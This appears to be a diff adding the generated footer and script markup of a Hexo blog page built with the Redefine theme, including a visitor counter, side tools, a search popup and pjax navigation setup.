+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalviews&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v0.5.2</a>
+        </div>
+        
+        
+        <script async data-pjax defer>
+            function odometer_init(){
+                    let el = document.getElementsByClassName('odometer');
+                    for (i = 0; i < el.length; i++) {
+                        od = new Odometer({
+                            el: el[i],
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    }
+            }
+            odometer_init();
+        </script>
+        <div id="start_time_div" style="display:none">
+            2023/1/20 00:00:00
+        </div>
+        
+        
+
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fa-solid fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fa-solid fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fa-solid fa-left-right"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fa-solid fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fa-solid fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fa-solid fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fa-solid fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
